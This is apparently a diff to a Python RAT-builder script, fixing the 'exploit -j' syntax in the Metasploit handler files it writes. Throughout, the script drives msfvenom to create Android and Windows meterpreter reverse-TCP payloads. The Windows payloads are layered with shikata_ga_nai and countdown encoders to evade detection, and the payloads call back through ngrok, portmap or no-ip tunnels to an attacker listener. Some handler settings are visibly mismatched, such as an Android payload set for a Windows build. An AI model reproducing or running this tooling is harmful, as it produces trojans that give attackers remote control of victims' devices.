@@ -44,7 +44,7 @@ def console_rc(name, content):
 def local(lhost, lport, payload, formt, ext):
     name = input('\n [\033[32m+\033[0m] \033[4mRAT\033[0m (\033[32mfile name\033[0m) > ')
     os.system('msfvenom -p {} lhost={} lport={} -f {} > {}.{}'.format(payload, lhost, lport, formt, name, ext))
-    console_rc(name, 'use multi/handler\nset payload {}\nset lhost {}\nset lport {}\nexploit-j'.format(payload, ip, lport))
+    console_rc(name, 'use multi/handler\nset payload {}\nset lhost {}\nset lport {}\nexploit -j'.format(payload, ip, lport))
     print('\n\033[34m[*]\033[0m Process completed, files \033[34;4m{}.{}\033[0m and \033[34;4m{}-console.rc\033[0m created successfully;\n\033[34m[*]\033[0m To open the listening, execute: \033[34;4mmsfconsole -r {}-console.rc\033[0m\n'.format(name, ext, name, name))
 
 def external(tunnel, payload, formt, ext):
@@ -56,7 +56,7 @@ def external(tunnel, payload, formt, ext):
         nport = int(input('\n [\033[32m+\033[0m] \033[4mRAT\033[0m (\033[32mngrok port\033[0m) > '))
         nhost = input('\n [\033[32m+\033[0m] \033[4mRAT\033[0m (\033[32mngrok host\033[0m) > ')
         os.system('msfvenom -p {} lhost={} lport={} -f {} > {}.{}'.format(payload, nhost, nport, formt, name, ext))
-        console_rc(name, 'use multi/handler\nset payload {}\nset lhost 127.0.0.1\nset lport {}\nexploit-j'.format(payload, lport))
+        console_rc(name, 'use multi/handler\nset payload {}\nset lhost 127.0.0.1\nset lport {}\nexploit -j'.format(payload, lport))
         print('\n\033[34m[*]\033[0m Process completed, files \033[34;4m{}.{}\033[0m and \033[34;4m{}-console.rc\033[0m created successfully;\n\033[34m[*]\033[0m To open the listening, execute: \033[34;4mmsfconsole -r {}-console.rc\033[0m\n'.format(name, ext, name, name))
 
     elif tunnel == 2:
@@ -64,14 +64,14 @@ def external(tunnel, payload, formt, ext):
         pport = int(input('\n [\033[32m+\033[0m] \033[4mRAT\033[0m (\033[32mportmap port\033[0m) > '))
         phost = input('\n [\033[32m+\033[0m] \033[4mRAT\033[0m (\033[32mportmap host\033[0m) > ')
         os.system('msfvenom -p {} lhost={} lport={} -f {} > {}.{}'.format(payload, phost, pport, formt, name, ext))
-        console_rc(name, 'use multi/handler\nset payload {}\nset lhost 127.0.0.1\nset lport {}\nexploit-j'.format(payload, lport))
+        console_rc(name, 'use multi/handler\nset payload {}\nset lhost 127.0.0.1\nset lport {}\nexploit -j'.format(payload, lport))
         print('\n\033[34m[*]\033[0m Process completed, files \033[34;4m{}.{}\033[0m and \033[34;4m{}-console.rc\033[0m created successfully;\n\033[34m[*]\033[0m To open the listening, execute: \033[34;4mmsfconsole -r {}-console.rc\033[\n'.format(name, ext, name, name))
 
     elif tunnel == 3:
         lhost = int(input('\n [\033[32m+\033[0m] \033[4mRAT\033[0m (\033[32mno-ip host\033[0m) > '))
         lport = int(input('\n [\033[32m+\033[0m] \033[4mRAT\033[0m (\033[32mlport\033[0m) > '))
         os.system('msfvenom -p {} lhost={} lport={} -f {} > {}.{}'.format(payload, lhost, lport, formt, name, ext))
-        console_rc(name, 'use multi/handler\nset payload {}\nset lhost {}\nset lport {}\nexploit-j'.format(payload, lhost, lport))
+        console_rc(name, 'use multi/handler\nset payload {}\nset lhost {}\nset lport {}\nexploit -j'.format(payload, lhost, lport))
         print('\n\033[34m[*]\033[0m Process completed, files \033[34;4m{}.{}\033[0m and \033[34;4m{}-console.rc\033[0m created successfully;\n\033[34m[*]\033[0m To open the listening, execute: \033[34;4mmsfconsole -r {}-console.rc\033[0m\n'.format(name, ext, name, name))
 
 def main():
@@ -99,7 +99,7 @@ def main():
                 nport = int(input('\n [\033[32m+\033[0m] \033[4mRAT\033[0m (\033[32mngrok port\033[0m) > '))
                 nhost = input('\n [\033[32m+\033[0m] \033[4mRAT\033[0m (\033[32mngrok host\033[0m) > ')
                 os.system('msfvenom -p android/meterpreter/reverse_tcp lhost={} lport={} --platform android -o {}.apk && d2j-apk-sign {}.apk && rm -f {}.apk && mv {}-signed.apk {}.apk'.format(nhost, nport, name, name, name, name, name))
-                console_rc(name, 'use multi/handler\nset payload android/meterpreter/reverse_tcp\nset lhost 127.0.0.1\nset lport {}\nset ExitOnSession false\nexploit-j'.format(lport))
+                console_rc(name, 'use multi/handler\nset payload android/meterpreter/reverse_tcp\nset lhost 127.0.0.1\nset lport {}\nset ExitOnSession false\nexploit -j'.format(lport))
                 print('\n\033[34m[*]\033[0m Process completed, files \033[34;4m{}.apk\033[0m and \033[34;4m{}-console.rc\033[0m created successfully;\n\033[34m[*]\033[0m To open the listening, execute: \033[34;4mmsfconsole -r {}-console.rc\033[0m\n'.format(name, name, name))
 
             elif tunnel == 2:
@@ -108,7 +108,7 @@ def main():
                 pport = int(input(' [\033[32m+\033[0m] \033[4mRAT\033[0m (\033[32mportmap port\033[0m) > '))
                 phost = input(' [\033[32m+\033[0m] \033[4mRAT\033[0m (\033[32mportmap host\033[0m) > ')
                 os.system('msfvenom -p android/meterpreter/reverse_tcp lhost={} lport={} --platform android -o {}.apk && d2j-apk-sign {}.apk && rm -f {}.apk && mv {}-signed.apk {}.apk'.format(phost, pport, name, name, name, name, name))
-                console_rc(name, 'use multi/handler\nset payload android/meterpreter/reverse_tcp\nset lhost 127.0.0.1\nset lport {}\nset ExitOnSession false\nexploit-j'.format(lport))
+                console_rc(name, 'use multi/handler\nset payload android/meterpreter/reverse_tcp\nset lhost 127.0.0.1\nset lport {}\nset ExitOnSession false\nexploit -j'.format(lport))
                 print('\n\033[34m[*]\033[0m Process completed, files \033[34;4m{}.apk\033[0m and \033[34;4m{}-console.rc\033[0m created successfully;\n\033[34m[*]\033[0m To open the listening, execute: \033[34;4mmsfconsole -r {}-console.rc\033[0m\n'.format(name, name, name))
 
             elif tunnel == 3:
@@ -141,7 +141,7 @@ def main():
                 nhost = input('\n [\033[32m+\033[0m] \033[4mRAT\033[0m (\033[32mngrok host\033[0m) > ')
                 os.system('msfvenom -p windows/meterpreter/reverse_tcp lhost={} lport={} -e x86/shikata_ga_nai -a x86 -f raw --platform windows | msfvenom -a x86 --platform windows -e x86/countdown -i 4 -f raw | msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -i 9 -f exe -o {}'.format(nhost, nport, name))
                 os.system('rm -f {}'.format(name))
-                console_rc(name, 'use multi/handler\nset payload android/meterpreter/reverse_tcp\nset lhost 127.0.0.1\nset lport {}\nset ExitOnSession false\nexploit-j'.format(lport))
+                console_rc(name, 'use multi/handler\nset payload android/meterpreter/reverse_tcp\nset lhost 127.0.0.1\nset lport {}\nset ExitOnSession false\nexploit -j'.format(lport))
                 print('\n\033[34m[*]\033[0m Process completed, files \033[34;4m{}.exe\033[0m and \033[34;4m{}-console.rc\033[0m created successfully;\n\033[34m[*]\033[0m To open the listening, execute: \033[34;4mmsfconsole -r {}-console.rc\033[0m\n'.format(name, name, name))
 
             elif tunnel == 2:
@@ -151,7 +151,7 @@ def main():
                 phost = input(' [\033[32m+\033[0m] \033[4mRAT\033[0m (\033[32mportmap host\033[0m) > ')
                 os.system('msfvenom -p windows/meterpreter/reverse_tcp lhost={} lport={} -e x86/shikata_ga_nai -a x86 -f raw --platform windows | msfvenom -a x86 --platform windows -e x86/countdown -i 4 -f raw | msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -i 9 -f exe -o {}'.format(phost, pport, name))
                 os.system('rm -f {}'.format(name))
-                console_rc(name, 'use multi/handler\nset payload android/meterpreter/reverse_tcp\nset lhost 127.0.0.1\nset lport {}\nset ExitOnSession false\nexploit-j'.format(lport))
+                console_rc(name, 'use multi/handler\nset payload android/meterpreter/reverse_tcp\nset lhost 127.0.0.1\nset lport {}\nset ExitOnSession false\nexploit -j'.format(lport))
                 print('\n\033[34m[*]\033[0m Process completed, files \033[34;4m{}.exe\033[0m and \033[34;4m{}-console.rc\033[0m created successfully;\n\033[34m[*]\033[0m To open the listening, execute: \033[34;4mmsfconsole -r {}-console.rc\033[0m\n'.format(name, name, name))
 
             elif tunnel == 3:
